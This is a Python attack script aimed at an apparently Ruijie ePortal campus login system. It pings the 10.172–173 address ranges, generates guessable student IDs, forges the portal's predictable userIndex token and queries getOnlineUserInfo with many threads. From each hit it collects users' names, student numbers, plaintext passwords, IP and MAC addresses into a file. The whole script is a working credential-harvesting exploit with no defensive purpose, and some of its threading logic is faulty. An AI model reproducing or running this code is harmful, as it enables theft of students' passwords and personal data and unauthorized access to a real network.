import requests, time, random, os, threading, json


class GetInfo(object):
    def __init__(self, userIndex):
        self.url = "http://192.168.203.130:8080/eportal/InterFace.do?method=getOnlineUserInfo"
        self.userIndex = userIndex
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"}

    def getinfo(self):
        res = requests.post(self.url, headers=self.headers, data={"userIndex": self.userIndex})
        res.encoding = "utf-8"
        return res.text


# 对字符串进行编码，字符则加三，"."则变成url编码2e
def code(str):
    result = ""
    for x in str:
        if (x == "."):
            result = result + "2e"
        else:
            result = result + "3" + x
    return (result)


def userIndex_make(ip):
    # 第一串固定字符(暂未知晓是什么，怀疑是锐捷的设备序列号一类的)_用于构造userIndex
    theFristStr = "3131373364373830303233616635663237303561633566383037623464363831"
    print("[+] 已成功定义固定的字符串值...\n" + theFristStr)
    # 生成用户名(学号)_用于构造userIndex
    # 定义年级列表_用于生成学号
    list_year = ["2017", "2016", "2018", "2015"]
    print("[+] 已成功定义年级...\n" + str(list_year))
    # 定义专业列表_用于生成学号
    list_major = ["1061", "1062", "1063", "1161", "1151", "1101", "1071", "1051", "0951", "0904", "0862", "0861",
                  "0856", "0806", "0805", "0801", "0754", "0701", "0652", "0651", "0607", "0606", "0604", "0603",
                  "0602", "0571", "0561", "0552", "0451", "0404", "0361", "0352", "0351", "0253", "0252", "0201",
                  "0152", "0151", "0104"]
    print("[+]已成功定义专业代号...\n" + str(list_major))
    # 定义班号_用于生成学号
    list_class = ["01", "02", "03", "04", "05"]
    print("[+]已成功定义班号...\n" + str(list_class))
    # 定义班内序号_用于生成学号
    list_num = list(range(1, 60, 1))  # 此处有待改进0-9的构造方法，应显示01-09
    print("[+]已成功定义班级内序列号...\n" + str(list_num))
    # 生成学号成品
    for year in list_year:
        for major in list_major:
            for clas in list_class:
                for num in list_num:
                    stu_num_0 = str(year) + str(major) + str(clas) + str(num).zfill(2)
                    print("[+]当前测试的账号为:"+ stu_num_0)
                    stu_num = code(stu_num_0)
                    userIndex = theFristStr + "5f" + ip + "5f" + stu_num
                    print(userIndex)
                    yield userIndex


def run(gen):
    while True:
        try:
            userIndex = gen.__next__()
        except:
            break
        info = GetInfo(userIndex)
        infom = info.getinfo()
        print("[+] 正在尝试", userIndex, "\n")
        # print(infom)
        if "获取用户信息失败" not in infom:
            print("[+] 获取用户信息成功")
            print(infom)
            jsinfo = json.loads(infom)
            result = "\t姓名" + jsinfo["userName"] + "\t学号" + jsinfo["userId"] + "密码" + jsinfo["password"] + "IP地址" + \
                     jsinfo["userIp"] + "MAC地址" + jsinfo["userMac"] + "服务类型" + jsinfo["service"]
            print(result)
            with open("Success.txt", "a", encoding="utf-8") as file:
                file.write(result + "\n")
                break
        time.sleep(random.random())


if __name__ == '__main__':
    threadNum = int(input(">>>请输入线程数(推荐输入20)："))
    # 生成IP地址_用于构造userIndex
    ip_a = ["10"]
    ip_b = list(range(172, 174))
    ip_c = list(range(2, 254))  # 一般254为网关，忽略掉
    ip_d = list(range(1, 254))
    # 生成IP成品
    for ip_1 in ip_a:
        for ip_2 in ip_b:
            for ip_3 in ip_c:
                for ip_4 in ip_d:
                    ip_ping = str(ip_1) + "." + str(ip_2) + "." + str(ip_3) + "." + str(ip_4)
                    net = os.system("ping " + ip_ping)
                    if net == 0:
                        ip = code(ip_ping)
                        userIndex = userIndex_make(ip)
                        threads = []
                        for i in range(threadNum):
                            thread = threading.Thread(target=run, args=(userIndex,))
                            thread.start()
                            threads.append(thread)
                            for thread in threads:
                                thread.join()
                            time.sleep(2)
                    else:
                        continue

    print()
    print(
        "\n\n\n[+++++++++++++++提示！+++++++++++++++]\n  已经爬取完成，结果保存在Success.txt\n[++++++++++++++++++++++++++++++++++++]")
